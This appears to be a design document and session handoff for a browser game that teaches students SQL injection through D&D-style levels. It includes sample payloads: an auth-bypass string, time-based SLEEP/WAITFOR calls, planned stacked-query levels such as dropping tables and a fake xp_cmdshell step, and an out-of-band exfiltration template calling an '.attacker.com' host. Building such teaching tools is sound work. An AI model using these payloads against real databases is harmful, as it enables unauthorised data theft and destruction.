# SQLi Dungeon — Design Doc

Living planning document for redesigning `aws-attack-surface.html` into a D&D-style step-by-step SQL injection learning game. Edit freely — this is the source of truth for scope and direction.

---

## 1. Concept (one paragraph)

A turn-based, D&D-inspired game that teaches CS majors what SQL injection is, how to perform each major class of attack, and — by consequence of playing the attacker — how to defend against it. The existing AWS attack-surface page is being repurposed: the AWS server model stays, but infrastructure-threat-propagation mechanics are replaced with per-turn "cast an injection payload" combat against vulnerable endpoints (nodes).

**Tone:** cyber-dungeon crawler. Terminal/grimoire hybrid — you're a "query mage" probing server "dungeons."

---

## 2. Audience & Learning Goals

- **Audience:** CS majors, roughly comfortable with SQL `SELECT`/`WHERE`, new-to-intermediate with web security.
- **After playing, a student can:**
  1. Recognize a vulnerable query pattern in source code.
  2. Write a working payload for each covered SQLi class.
  3. Explain *why* the payload works (string concatenation, no parameterization, error leakage, etc.).
  4. Name at least one defense per attack class (prepared statements, allowlists, least-privilege DB users, WAF patterns, etc.).

---

## 3. SQLi Classes to Cover (cover all)

Level chapter per class. Order is pedagogical (each builds on the last). create 5 levels per chapter

1. **Classic / In-band — Auth Bypass** (`' OR '1'='1`)
2. **Error-Based** (extract data via forced DB errors)
3. **UNION-Based** (column count, data types, cross-table extraction)
4. **Boolean-Based Blind** (true/false inference)
5. **Time-Based Blind** (`SLEEP()` / `WAITFOR DELAY`)
6. **Stacked Queries** (`;` chaining, where the DB allows it)
7. **Second-Order** (payload stored now, fires later on a different query)
8. **Out-of-Band** (DNS / HTTP exfiltration — simulated)

> **Open question:** include NoSQL injection as a bonus chapter, or keep strictly SQL? *(yes this would be nice to see)*

---

## 4. Game Loop (D&D-style)

Each encounter = one vulnerable endpoint on the AWS server graph (reuse existing node model).

**Turn structure:**
1. **Recon phase** — player inspects the endpoint: request shape, visible response, error verbosity. Costs 0–1 action. *(create a hint button that gives little tid-bits of help)*
2. **Craft phase** — player composes a payload from SQL "spell components" (tokens / snippets they've unlocked). (give a syntax CheatSheet, don't let the cheatsheet explain what the words do during a active level but have it show what words do during sandbox.)
3. **Cast phase** — payload is submitted; the simulated DB responds. Success/partial/fail is narrated.
4. **Loot phase** — on success: XP, unlocks (new tokens, new endpoints), and a **defense card** explaining the fix.

**Stats to track per run:** HP (detections before you're IP-banned), MP (rate-limit budget), XP, payload inventory, discovered schema. (give a detailed stat tracker, to see how to gain these stats.)

**Dice / randomness:** WAF checks and blind-inference oracles roll against player "Stealth" and "Insight" stats — keeps it D&D-flavored without being unfair (failures always teach something). I like this.
---

## 5. Progression Structure

```
Chapter 1: Auth Bypass
  └─ Level 1.1 → 1.2 → 1.3 → 1.4   (linear, scripted encounters)
  └─ Sandbox 1                      (unlocked after 1.3; free-form endpoint)

Chapter 2: Error-Based
  └─ Level 2.1 → 2.2 → 2.3
  └─ Sandbox 2

... (same pattern per class)

Final: Multi-class Dungeon (boss encounter requiring chained techniques)
```

- **Levels** = curated, one correct-ish path, hints available.
- **Sandbox** = same endpoint family, randomized schema/filters, no hints, leaderboard-friendly.

> **Open question:** how many levels per chapter before sandbox unlocks — 3? 4? *(4)*

---

## 6. Tech Stack Decision

**Default: vanilla JS + HTML + CSS**, single-page, matching the rest of the repo.

**React only if** one of these becomes true:
- Inventory / schema panels need 50+ reactive components with frequent re-renders.
- We add multi-route navigation beyond what `<a href>` between HTML files handles.
- State complexity (turn state + inventory + unlocked chapters + save/load) becomes painful in plain JS.

Until then: keep it one static file so it deploys to GitHub Pages with zero build step.

**Persistence:** `localStorage` for save/resume. No backend.

**"AWS server" model:** reuse the existing node graph from `aws-attack-surface.html` (lines ~1–1895). Nodes become endpoints; edges become "you can move here next." The threat-propagation sim is removed.

---

## 7. Aesthetic (new)

The current page is cyberpunk-neon (cyan/magenta on near-black, Share Tech Mono + Orbitron). The new game gets a **distinct** look:

- **Palette direction:** "arcane terminal" — phosphor green (`#7FFF9E`) + parchment cream (`#E8DCC4`) + ink-black (`#0C0C0A`) + warning amber.
- **Typography:** IBM Plex Mono for code/payloads; a serif display face (e.g., Cinzel or IM Fell) for chapter titles & lore text.
- **Layout metaphor:** left panel = spellbook (payload components / discovered schema); center = "dungeon" node map; right panel = combat log / dice rolls.
- **Motion:** parchment edges curl on hover; payloads "inscribe" character-by-character when cast; crit hits flash gold.

> **Open question:** keep it fully text/parchment, or allow pixel-art sprites for nodes/bosses? *(allow sprites)*

---

## 8. File Plan

Working inside the existing repo, on `main`:

- `aws-attack-surface.html` — **rewritten** into the SQLi game (keeps the URL + server model).
- `DESIGN.md` — this file.
- *(possibly)* `assets/sqli-levels.json` — level definitions pulled out of HTML once the list grows.
- *(possibly)* `sqli-sandbox.html` — if sandbox mode needs a dedicated page.

Nav links in `index.html` / tutorials updated to point at the new game once chapter 1 is playable.

---

## 9. Build Order (proposed)

1. **Scaffolding:** strip threat-propagation code from `aws-attack-surface.html`, keep node/edge renderer. New CSS theme.
2. **Turn engine:** state machine for recon → craft → cast → loot.
3. **Chapter 1 (Auth Bypass):** 3 levels + 1 sandbox. Ship + playtest.
4. **Chapter 2 (Error-Based).** Same shape.
5. Repeat through chapter 8.
6. **Boss dungeon** + save/load polish.

Each chapter is independently shippable.

---

## 10. Open Questions (edit me)

- [ ] Number of levels per chapter before sandbox?
- [ ] Include NoSQL bonus chapter?
- [ ] Pixel sprites, or pure text/parchment aesthetic?
- [ ] Should "defense cards" be a separate collectible codex page, or inline after each victory?
- [ ] Multiplayer/async (share a sandbox seed with a classmate) — out of scope, or stretch goal?
- [ ] How explicit should we be about real-world ethics framing (only attack systems you own / have permission for)?

---

## 11. Build Status — Session Handoff (as of 2026-04-24)

### ✅ Done

| Area | Status | Notes |
|---|---|---|
| Arcane-terminal theme | ✅ | Phosphor green + parchment + gold + amber; Cinzel + IBM Plex Mono; scanline overlay; scrollbar styled. |
| 3-column layout | ✅ | Spellbook / Dungeon / Combat Log + nav + stat bar + phase bar. |
| Stat bar | ✅ | HP/MP/XP/Stealth/Insight + chapter label. |
| Stats tab (growth rules) | ✅ | Visible tab explains how each stat grows. |
| Modal system | ✅ | For cheatsheet + defense cards. |
| Save/load | ✅ | `localStorage` key `sqli-dungeon.save.v1`. Survives refresh. |
| Turn state machine | ✅ | Recon → Craft → Cast → Loot. `advance()` routes based on phase. |
| d20 + skill checks | ✅ | `skillCheck(stat, dc)` with nat 20 / nat 1 rules. WAF check = Stealth vs DC 12 by default. |
| Payload builder | ✅ | Textarea + clickable tokens in Spellbook. Locked tokens greyed until unlocked. |
| Cheatsheet gating | ✅ | Definitions hidden during active levels, visible in sandbox (`state.level === 99`). |
| Hint system | ✅ | Pulls per-level hints, advances through them. |
| Dungeon map canvas | ✅ | 6 nodes per chapter (5 levels + sandbox), bezier edges, locked/unlocked/active/cleared states, clickable, hover detail. |
| Chapter auto-advance | ✅ | Clearing last level of a chapter unlocks next chapter, +2 maxHP, full heal. |
| **Chapter 1: Auth Bypass** | ✅ | 5 levels (Wooden Door, Iron Gate, Rune Lock, Silent Guard, Captain's Cipher) + sandbox generator. |
| **Chapter 2: Error-Based** | ✅ | 5 levels (Loose Tongue, Extracted Truth, XML Trick, Cast of Lies, Hash Exposed) + sandbox. |
| **Chapter 3: UNION-Based** | ✅ | 5 levels (Count the Pillars, Where the Text Sits, Name of the Realm, Atlas, Dump) + sandbox. |

### 🔨 Remaining

| Area | Priority | Notes for next session |
|---|---|---|
| **Chapter 4: Boolean-Based Blind** | Next | 5 levels. Idea progression: detect true/false response shape → infer single char via `SUBSTRING`+`ASCII` → extract DB name → extract table name → extract admin password char-by-char. Sandbox: random char target. Teach binary search as the optimization. |
| **Chapter 5: Time-Based Blind** | High | Same arc but with `SLEEP(n)` / `WAITFOR DELAY`. Simulate "response took >3s" in the engine — just pattern-match for `SLEEP` / `pg_sleep` / `WAITFOR` with a numeric arg. Introduce Insight rolls for blind-inference accuracy. |
| **Chapter 6: Stacked Queries** | Med | `;` separated statements. Require the game to model different DBs — MSSQL/Postgres allow stacking, MySQL often doesn't. Levels: drop a table, insert admin row, disable audit trigger, call `xp_cmdshell`-style fake RCE, clean up. |
| **Chapter 7: Second-Order** | Med | Two-step: Stage 1 store payload (e.g., signup form), Stage 2 trigger it later (profile page re-queries with stored value, unsanitized). Engine needs a "stored payload" slot that a later level reads. Easiest: two phases inside one level, or two linked levels. |
| **Chapter 8: Out-of-Band (OOB)** | Med | Simulate DNS/HTTP exfil. Payloads like `LOAD_FILE(CONCAT('\\\\\\\\',(SELECT…),'.attacker.com'))`. Engine just needs to pattern-match for OOB functions + a subquery. Narrate "your Burp Collaborator lights up." |
| **NoSQL bonus** | Low | MongoDB-style `{ $ne: null }`, `$gt`/`$where`, JS injection in `$where`. Endpoint input is JSON, so payload builder should allow raw JSON. |
| **Boss dungeon** | Low | Multi-class. One encounter requiring chained techniques (e.g., UNION to find column, Boolean blind to find admin id, Time-based to confirm hash). State tracks sub-goals. |
| **Sprite art** | Low | User approved. Small pixel sprites per vuln class (spider/ghost/dragon/etc.) on nodes. Inline SVG or PNG base64 — keep single-file. |
| **Nav link update** | Polish | `index.html` + `neural-heatmap.html` + `tutorial-*.html` reference "Attack Surface" — rename to "SQLi Dungeon" in their nav bars. |
| **Asset extraction** | Polish | If `aws-attack-surface.html` grows past ~3000 lines, pull `CHAPTERS` into `assets/sqli-levels.js` and `<script src>`-include it. Not needed yet. |

### 🧭 How to Continue (for the next Claude session)

1. **Open**: `C:\Users\mercu\Claude\neural-heatmap\aws-attack-surface.html`.
2. **Find the anchor**: search for `// Chapters 4 – 8 + NoSQL bonus still to author`. That's exactly where new chapter entries go inside the `CHAPTERS` object.
3. **Author pattern**: every chapter object needs `{ id, name, class, intro, levels: { 1..5 }, sandbox(seed) }`. Every level needs `{ id, name, endpoint, query, field, goal, reconNotes[], hints[], check(payload)→{ok, narrate}, unlockTokens[], defense: { title, body, code, tip } }`. Use Chapters 1–3 as templates.
4. **`check(payload)` rules**: return `{ ok: true, narrate }` for full success, `{ ok: 'partial', narrate }` for credit-but-messy, `{ ok: false, narrate }` for failure. The engine already handles XP, defense card, phase routing.
5. **Tokens**: add new tokens to the `KNOWN_TOKENS` array near the top of the script, then reference them in `unlockTokens` per level. They appear locked until a level unlocks them.
6. **Commit cadence**: one chapter per commit; push after each. Commit messages have been `"Chapter N: Topic (5 levels + sandbox)"`.
7. **Testing locally**: just open `aws-attack-surface.html` in a browser. No build step. localStorage persists progress — clear it via DevTools if you want a fresh run.
8. **If levels grow too heavy**: extract `CHAPTERS` to `assets/sqli-levels.js` and `<script src="assets/sqli-levels.js"></script>` *before* the main script. Don't do this prematurely.
9. **DO NOT** rewrite scaffold, theme, or engine — they are settled. Only add to `CHAPTERS` and polish.

### 🐛 Known limitations

- The `mulberry32` seeded RNG is deterministic per seed — re-rolling the sandbox generates a new seed, but the same seed will always produce the same encounter. This is intentional so students can share seeds.
- `check()` functions use regex against the payload string — they approve any payload that matches the shape, not just the exact "canonical" payload. That's fine for learning (rewards creative solutions) but a determined student can pass with a borderline match. Tighten regexes if that matters.
- No audio / no animations beyond CSS transitions. Scope choice.
- Cheatsheet definitions are hardcoded in `showCheatsheet()`. If the token list grows, move definitions next to the tokens themselves.

---

*Edit this file to redirect the build. Anything marked "Open question" is a nudge for your call.*
